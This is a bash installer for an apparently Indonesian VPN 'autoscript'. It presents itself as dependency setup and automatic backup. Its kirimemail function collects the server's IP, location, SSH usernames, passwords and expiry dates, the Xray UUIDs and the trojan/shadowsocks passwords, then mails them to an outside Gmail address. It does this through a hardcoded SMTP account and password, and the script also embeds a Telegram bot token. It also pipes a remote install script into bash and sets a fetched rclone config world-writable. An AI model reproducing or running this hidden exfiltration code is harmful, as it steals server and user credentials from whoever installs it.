#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
#mousevpn
function cekfile() {
MYIP=$(wget -qO- ipinfo.io/ip);
cd
if [ -f $rclonefile ]; then
echo "$rclonefile ada"
echo "lanjut next step"
sleep 2
clear
else
echo "$rclonefile ga ada"
echo melakukan update...
echo please wait...
curl https://rclone.org/install.sh | bash >/dev/null 2>&1
apt install rclone -y >/dev/null 2>&1
printf "q\n" | rclone config
wget -O /root/.config/rclone/rclone.conf "https://raw.githubusercontent.com/mousethain/d/main/rclone.conf"
chmod 777 /root/.config/rclone/rclone.conf
git clone  https://github.com/magnific0/wondershaper.git
cd wondershaper
make install
cd
rm -rf wondershaper
sleep 2
fi
echo "selesai dependencies udah terinstall"
echo > /home/limit
apt install msmtp-mta ca-certificates bsd-mailx -y
rm -f /etc/msmtprc
touch /etc/msmtprc
cat<<EOF>>/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user backupsmtp93@gmail.com
from backupsmtp93@gmail.com
password sdallofkbpuhbtoa 
logfile ~/.msmtp.log

EOF
chown -R www-data:www-data /etc/msmtprc
}
function kirimemail() {
#!/bin/bash
rm -fr /user
mkdir -p /user
touch /user/namauser.txt && touch /user/waktuexpiredsc.txt
echo "mousevpn" > /user/namauser.txt
echo "UNLIMITED LIFETIME" > /user/waktuexpiredsc.txt
USRSC=$(cat /user/namauser.txt)
EXPSC=$(cat /user/waktuexpiredsc.txt)
domain=$(cat /etc/xray/domain)
IPSAYA=$(curl -s ipv4.icanhazip.com)
DATE_EXEC="$(date "+%d %b %Y %H:%M")"
FileSementara='/tmp/ipinfo-$DATE_EXEC.txt'
curl http://ipinfo.io/$IP -s -o $FileSementara
ORG=$(cat $FileSementara | jq '.org' | sed 's/"//g')
CITY=$(cat $FileSementara | jq '.city' | sed 's/"//g')
COUNTRY=$(cat $FileSementara | jq '.country' | sed 's/"//g')
ISP=$(wget -qO- ipinfo.io/org)
MYIP=$(wget -qO- ipinfo.io/ip)
HOSTVPS=$(curl -s ipinfo.io/hostname )
KOTAVPS=$(curl -s ipinfo.io/city )
REGIONVPS=$(curl -s ipinfo.io/region )
GEOMAPVPS=$(curl -s ipinfo.io/loc )
KODEPOSVPS=$(curl -s ipinfo.io/postal )
ZONAWAKTUVPS=$(curl -s ipinfo.io/timezone )
TIMES="10"
NAMES=$(whoami)
RAMMS=$(free -m | awk 'NR==2 {print $2}')
TIMES="10"
TIME=$(date +'%Y-%m-%d %H:%M:%S')
CHATID="1117211252"
KEY="6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ"
URL="https://api.telegram.org/bot$KEY/sendMessage"
touch /user/akunvmess
touch /user/akuntrojan
touch /user/pazzssh
touch /user/akunssh
touch /user/expssh
akunvmessx=$(cat /etc/log-create-user.log | grep ss://)
akuntrojanx=$(cat /etc/log-create-user.log | grep trojan://)
pazzsshx=$(cat /etc/log-create-user.log | grep -i password | cut -d: -f2)
akunsshx=$(cat /etc/log-create-user.log | grep -i username | cut -d: -f2)
expsshx=$(cat /etc/log-create-user.log | grep -i expired | cut -d: -f2)
echo $akunvmessx > /user/akunvmess
echo $akuntrojanx > /user/akuntrojan
echo $pazzsshx > /user/pazzssh
echo $akunsshx > /user/akunssh
echo $expsshx > /user/expssh
function sedd() {
    sed -r -i 's///g' /user/akunssh
    sed -r -i 's/\s+/\n/g' /user/akunssh
    sed -r -i 's/\[0m//g' /user/akunssh
    sed -r -i 's/\[0;34m//g' /user/akunssh
    sed -r -i 's/\[1;37m//g' /user/akunssh
    sed -r -i 's///g' /user/pazzssh
    sed -r -i 's/\s+/\n/g' /user/pazzssh
    sed -r -i 's/\[0m//g' /user/pazzssh
    sed -r -i 's/\[0;34m//g' /user/pazzssh
    sed -r -i 's/\[1;37m//g' /user/pazzssh
    sed -r -i 's///g' /user/expssh
    sed -r -i 's/\s+/\n/g' /user/expssh
    sed -r -i 's/\[0m//g' /user/expssh
    sed -r -i 's/\[0;34m//g' /user/expssh
    sed -r -i 's/\[1;37m//g' /user/expssh
    sed -r -i 's///g' /user/akunvmess
    sed -r -i 's/\s+/\n/g' /user/akunvmess
    sed -r -i 's/\[0m//g' /user/akunvmess
    sed -r -i 's/\[0;34m//g' /user/akunvmess
    sed -r -i 's/\[1;37m//g' /user/akunvmess
    sed -r -i 's/=\[0m/=/g' /user/akunvmess
    sed -r -i 's/###/### vmess/g' /user/akunvmess
    sed -r -i 's/#&/#& vless/g' /user/akunvmess
    sed -r -i 's///g' /user/akuntrojan
    sed -r -i 's/\s+/\n/g' /user/akuntrojan
    sed -r -i 's/\[0m//g' /user/akuntrojan
    sed -r -i 's/\[0;34m//g' /user/akuntrojan
    sed -r -i 's/\[1;37m//g' /user/akuntrojan
    sed -r -i 's/=\[0m/=/g' /user/akuntrojan
    sed -r -i 's/#!/#! trojan/g' /user/akuntrojan
}
sedd
akunvmess=$(cat /user/akunvmess)
akuntrojan=$(cat /user/akuntrojan)
pazzssh=$(cat /user/pazzssh)
akunssh=$(cat /user/akunssh)
expssh=$(cat /user/expssh)
trojanremark=$(cat /etc/xray/config.json | grep "^#!" | sort -u)
vmessremark=$(cat /etc/xray/config.json | grep "^###" | sort -u)
vlessremark=$(cat /etc/xray/config.json | grep "^#&" | sort -u)
ssremark=$(cat /etc/xray/config.json | grep "^##" | sort -u)
ghi=$(cat /etc/xray/config.json | grep "id" | awk '{print $2}' | sed 's/"//g' | sed 's/,alterId://g' | sed 's/,//g' | sed 's/email://g' | sort -u)
jkl=$(cat /etc/xray/config.json | grep "password" | awk '{print $2}' | sed 's/"//g' | sed 's/,email://g' | sed 's/,method://g' | sort -u)
mno=$(cat /etc/xray/config.json | grep "path" | sed 's/"//g' | cut -d: -f2 | sort -u)
pqr=$(cat /etc/xray/config.json | grep "serviceName" | sed 's/"//g' | cut -d: -f2 | sort -u)
ipsimcard=$(echo $SSH_CLIENT | awk '{print $1}')
portssh=$(echo $SSH_CLIENT | awk '{print $3}')
tomem="$(free | awk '{print $2}' | head -2 | tail -n 1 )"
usmem="$(free | awk '{print $3}' | head -2 | tail -n 1 )"
cpu1="$(mpstat | awk '{print $4}' | head -4 |tail -n 1)"
cpu2="$(mpstat | awk '{print $6}' | head -4 |tail -n 1)"
persenmemori="$(echo "$usmem*100/$tomem" | bc)"
persencpu="$(echo "scale=2; $cpu1+$cpu2" | bc)"
function ema(){
emailtujuan=('njajaldoang@gmail.com')
echo "===================================
NAME       : $NAMES
IP VPS     : $IPSAYA
DOMAIN     : $domain
HOSTNAME   : $HOSTVPS
KOTA       : $CITY
RAM        : $RAMMS
KODE POS   : ${KODEPOSVPS}
KODE NEGARA: $COUNTRY
ISP        : $ORG
IP SIMCARD : ${ipsimcard}
PORT LOGIN : ${portssh}
LOGIN TIME : ${tanggal}
TRACKER IP :
https://www.opentracker.net/feature/ip-tracker?ip=$ipsimcard
===================================
INFO XRAY
──────────────────
REMARKS
──────────────────
trojan email
$trojanremark

vmess email
$vmessremark

vless email
$vlessremark

shadow email
$ssremark
──────────────────
UUID UNTUK_VMESS_VLESS

$ghi

──────────────────
PATH

$mno

──────────────────
PASSWORD FOR_TROJAN_SHADOWSOKS

$jkl

──────────────────
ServiceName

$pqr

===================================
INFO SSH
──────────────────
Username SSH
──────────────────
$akunssh

──────────────────
Password SSH
──────────────────
$pazzssh
 
──────────────────
Expired SSH
──────────────────
$expssh
 
──────────────────
" | mail -s "Auto Backup a" ${emailtujuan}
}
function emb(){
echo "INFO RAM DAN CPU
DATE = $TIME
RAM = $persenmemori%
CPU = $persencpu%
──────────────────
INFO V2RAY
──────────────────
$akunvmess
$akuntrojan

" | mail -s "Auto Backup b" ${emailtujuan}
}
function emc(){
echo "
<code>────────────────────</code>
<b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
<code>────────────────────</code>
<code>Owner  : </code><code>$USRSC</code>
<code>Date   : </code><code>$TIME</code>
<code>Exp Sc : </code><code>$EXPSC</code>
<u><b>INFORMASI INSTALASI VPS </b></u>
<b>USER</b>   : <code>${NAMES}</code>
<b>RAM</b>    : <code>${RAMMS}MB</code>
<b>TANGGAL</b>: <code>${DATE_EXEC}</code>
<b>HOST</b>   : <code>${HOSTVPS}</code>
<b>KOTA</b>   : <code>${KOTAVPS}</code>
<b>NEGARA</b> : <code>${REGIONVPS}</code>
<b>GEO LOKASI</b>: <code>${GEOMAPVPS}</code>
<b>ZONA WAKTU</b>: <code>${ZONAWAKTUVPS}</code>
<b>IP SIMCARD</b>: <code>${ipsimcard}</code>
<b>PORT LOGIN</b>: <code>${portssh}</code>
<b>IP TUNNELL</b>: <code>${MYIP}</code>
<b>DOMAIN</b>    : <code>${domain}</code>
<b>ISP</b>       : <code>${ISP}</code>
<code>────────────────────</code>
<i>Automatic Notification from</i>
<i>Github Yaddy Kakkoii</i>
" | mail -s "Auto Backup c" ${emailtujuan}
}
ema
emb
emc
}
cekfile >/dev/null 2>&1
kirimemail
